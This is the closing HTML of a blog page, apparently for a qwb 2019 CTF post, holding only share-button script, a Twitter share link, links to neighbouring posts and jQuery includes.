a(){if(!window.open([f,p].join(''),'mb',['toolbar=0,status=0,resizable=1,width=620,height=450,left=',(s.width-620)/2,',top=',(s.height-450)/2].join('')))u.href=[f,p].join('');};if(/Firefox/.test(navigator.userAgent)){setTimeout(a,0)}else{a()}})(screen,document,encodeURIComponent));"></a></div><div class="twitter"><a class="fa fa-twitter" href="http://twitter.com/home?status=,http://microvorld.com/2019/06/06/CTF/qwb2019/,null,qwbctf2019,;"></a></div></div><div class="pagination"><ul class="clearfix"><li class="pre pagbuttons"><a class="btn" role="navigation" href="/2019/06/12/CTF/fbctf2019/" title="fbctf2019">上一篇</a></li><li class="next pagbuttons"><a class="btn" role="navigation" href="/2019/05/25/OS/shell的重定向/" title="Linux常用指令及其含义">下一篇</a></li></ul></div></div></div></div></div><script src="/js/jquery.js"></script><script src="/js/jquery-migrate-1.2.1.min.js"></script><script src="/js/jquery.appear.js"></script></body></html>